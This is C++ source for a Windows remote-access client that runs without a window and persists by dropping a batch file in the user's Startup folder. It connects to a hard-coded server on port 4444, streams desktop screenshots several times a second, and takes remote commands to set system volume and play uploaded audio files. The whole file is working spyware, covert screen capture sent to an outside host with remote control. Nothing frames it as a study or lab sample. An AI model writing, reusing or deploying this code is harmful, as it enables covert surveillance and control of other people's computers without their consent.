// client.cpp
#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#include <gdiplus.h>
#include <mmsystem.h>        // for PlaySound
#include <string>
#include <thread>
#include <fstream>
#include <vector>
#include <cstdio>

#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "gdiplus.lib")
#pragma comment(lib, "winmm.lib")
#pragma comment(lib, "ole32.lib")
#pragma comment(linker, "/SUBSYSTEM:windows /ENTRY:mainCRTStartup")

const char* SERVER_IP = "192.168.0.104";  // change to your server IP
const int PORT = 4444;

// ------------------------------------------------------------------
// Volume control (Mixer API – set master volume 0..100)
// ------------------------------------------------------------------
void SetSystemVolume(int volPercent) {
    HMIXER hMixer;
    if (mixerOpen(&hMixer, 0, 0, 0, MIXER_OBJECTF_MIXER) != MMSYSERR_NOERROR)
        return;
    MIXERLINE ml = { sizeof(ml) };
    ml.dwComponentType = MIXERLINE_COMPONENTTYPE_DST_SPEAKERS;
    if (mixerGetLineInfo((HMIXEROBJ)hMixer, &ml, MIXER_GETLINEINFOF_COMPONENTTYPE)
        != MMSYSERR_NOERROR) {
        mixerClose(hMixer);
        return;
    }
    MIXERLINECONTROLS mlc = { sizeof(mlc) };
    MIXERCONTROL mc = { sizeof(mc) };
    mlc.cControls = 1;
    mlc.cbmxctrl = sizeof(mc);
    mlc.pamxctrl = &mc;
    mlc.dwLineID = ml.dwLineID;
    mlc.dwControlType = MIXERCONTROL_CONTROLTYPE_VOLUME;
    if (mixerGetLineControls((HMIXEROBJ)hMixer, &mlc, MIXER_GETLINECONTROLSF_ONEBYTYPE)
        != MMSYSERR_NOERROR) {
        mixerClose(hMixer);
        return;
    }
    // Scale percentage to hardware value (assume max = 0xFFFF)
    DWORD val = (volPercent * 0xFFFF) / 100;
    MIXERCONTROLDETAILS mcd = { sizeof(mcd) };
    MIXERCONTROLDETAILS_UNSIGNED mcdu = { val };
    mcd.hwndOwner = NULL;
    mcd.cbDetails = sizeof(MIXERCONTROLDETAILS_UNSIGNED);
    mcd.paDetails = &mcdu;
    mcd.cChannels = 1;        // set both channels? try 1 first
    mcd.dwControlID = mc.dwControlID;
    mixerSetControlDetails((HMIXEROBJ)hMixer, &mcd, MIXER_SETCONTROLDETAILSF_VALUE);
    // If stereo, set second channel too
    MIXERCONTROLDETAILS mcd2 = { sizeof(mcd2) };
    MIXERCONTROLDETAILS_UNSIGNED mcdu2 = { val };
    mcd2.hwndOwner = NULL;
    mcd2.cbDetails = sizeof(MIXERCONTROLDETAILS_UNSIGNED);
    mcd2.paDetails = &mcdu2;
    mcd2.cChannels = 2;       // actually need to set for each channel
    mcd2.dwControlID = mc.dwControlID;
    mixerSetControlDetails((HMIXEROBJ)hMixer, &mcd2, MIXER_SETCONTROLDETAILSF_VALUE);
    mixerClose(hMixer);
}

// ------------------------------------------------------------------
// JPEG encoder helper
// ------------------------------------------------------------------
int GetEncoderClsid(const WCHAR* format, CLSID* pClsid) {
    UINT num = 0, size = 0;
    Gdiplus::GetImageEncodersSize(&num, &size);
    if (size == 0) return -1;
    Gdiplus::ImageCodecInfo* pCodecInfo = (Gdiplus::ImageCodecInfo*)malloc(size);
    Gdiplus::GetImageEncoders(num, size, pCodecInfo);
    for (UINT j = 0; j < num; ++j) {
        if (wcscmp(pCodecInfo[j].MimeType, format) == 0) {
            *pClsid = pCodecInfo[j].Clsid;
            free(pCodecInfo);
            return j;
        }
    }
    free(pCodecInfo);
    return -1;
}

// ------------------------------------------------------------------
// Reliable send all bytes
// ------------------------------------------------------------------
bool SendAll(SOCKET sock, const char* data, int len) {
    int total = 0;
    while (total < len) {
        int sent = send(sock, data + total, len - total, 0);
        if (sent <= 0) return false;
        total += sent;
    }
    return true;
}

// ------------------------------------------------------------------
// Reliable recv all bytes
// ------------------------------------------------------------------
bool RecvAll(SOCKET sock, char* data, int len) {
    int total = 0;
    while (total < len) {
        int got = recv(sock, data + total, len - total, 0);
        if (got <= 0) return false;
        total += got;
    }
    return true;
}

// ------------------------------------------------------------------
// Play a sound file (MP3) using MCI
// ------------------------------------------------------------------
void PlayRemoteSound(const std::string& filename) {
    std::string cmd = "open \"" + filename + "\" type mpegvideo alias nyxsound";
    mciSendStringA(cmd.c_str(), NULL, 0, NULL);
    mciSendStringA("play nyxsound", NULL, 0, NULL);
    // We won't wait; it plays asynchronously
}

// ------------------------------------------------------------------
// Command handler thread – listens for 'V' and 'P' commands
// ------------------------------------------------------------------
void CommandListener(SOCKET sock) {
    while (true) {
        char cmd;
        if (recv(sock, &cmd, 1, 0) != 1)
            break;  // connection lost

        if (cmd == 'V') {
            int vol;
            if (!RecvAll(sock, (char*)&vol, 4)) break;
            SetSystemVolume(vol);
        }
        else if (cmd == 'P') {
            int fsize;
            if (!RecvAll(sock, (char*)&fsize, 4)) break;
            std::vector<char> buf(fsize);
            if (!RecvAll(sock, buf.data(), fsize)) break;

            // Save to temp file
            char tmpPath[MAX_PATH];
            GetTempPathA(MAX_PATH, tmpPath);
            std::string tmpFile = std::string(tmpPath) + "nyx_remote.mp3";
            std::ofstream out(tmpFile, std::ios::binary);
            out.write(buf.data(), fsize);
            out.close();
            PlayRemoteSound(tmpFile);
            // Optionally delete after playing? Won't, for now.
        }
        else {
            break;  // unknown command
        }
    }
}

// ------------------------------------------------------------------
// Main – add to startup, connect, stream screenshots + listen commands
// ------------------------------------------------------------------
int main() {
    // Add to startup
    char path[MAX_PATH];
    GetModuleFileNameA(NULL, path, MAX_PATH);
    std::string startup = std::string(getenv("USERPROFILE")) + "\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\nyxr.bat";
    std::ofstream bat(startup);
    bat << "@echo off\nstart \"\" \"" << path << "\"";
    bat.close();

    while (true) {
        WSADATA wsa;
        WSAStartup(MAKEWORD(2,2), &wsa);
        SOCKET sock = socket(AF_INET, SOCK_STREAM, 0);
        if (sock == INVALID_SOCKET) {
            WSACleanup();
            Sleep(5000);
            continue;
        }
        sockaddr_in addr;
        addr.sin_family = AF_INET;
        addr.sin_port = htons(PORT);
        inet_pton(AF_INET, SERVER_IP, &addr.sin_addr);

        if (connect(sock, (sockaddr*)&addr, sizeof(addr)) != 0) {
            closesocket(sock);
            WSACleanup();
            Sleep(5000);
            continue;
        }

        // Start command listener thread
        std::thread cmdThread(CommandListener, sock);
        cmdThread.detach();

        // Initialize GDI+ once per connection
        Gdiplus::GdiplusStartupInput gdiplusStartupInput;
        ULONG_PTR gdiplusToken;
        Gdiplus::GdiplusStartup(&gdiplusToken, &gdiplusStartupInput, NULL);
        CLSID jpegClsid;
        GetEncoderClsid(L"image/jpeg", &jpegClsid);

        // Screenshot loop
        while (true) {
            HWND hwnd = GetDesktopWindow();
            HDC hdc = GetDC(hwnd);
            RECT rect;
            GetClientRect(hwnd, &rect);
            int w = rect.right, h = rect.bottom;
            HDC hdcMem = CreateCompatibleDC(hdc);
            HBITMAP hBitmap = CreateCompatibleBitmap(hdc, w, h);
            SelectObject(hdcMem, hBitmap);
            BitBlt(hdcMem, 0, 0, w, h, hdc, 0, 0, SRCCOPY);

            Gdiplus::Bitmap bitmap(hBitmap, NULL);
            DeleteObject(hBitmap);
            DeleteDC(hdcMem);
            ReleaseDC(hwnd, hdc);

            IStream* pStream = NULL;
            CreateStreamOnHGlobal(NULL, TRUE, &pStream);
            bitmap.Save(pStream, &jpegClsid, NULL);

            STATSTG stat;
            pStream->Stat(&stat, STATFLAG_NONAME);
            ULONG jpegSize = stat.cbSize.LowPart;
            BYTE* jpegData = new BYTE[jpegSize];
            LARGE_INTEGER li = {};
            pStream->Seek(li, STREAM_SEEK_SET, NULL);
            ULONG bytesRead;
            pStream->Read(jpegData, jpegSize, &bytesRead);
            pStream->Release();

            if (!SendAll(sock, (char*)&jpegSize, 4) ||
                !SendAll(sock, (char*)jpegData, jpegSize)) {
                delete[] jpegData;
                break;
            }
            delete[] jpegData;
            Sleep(180);
        }

        Gdiplus::GdiplusShutdown(gdiplusToken);
        closesocket(sock);
        WSACleanup();
        Sleep(3000);
    }
    return 0;
}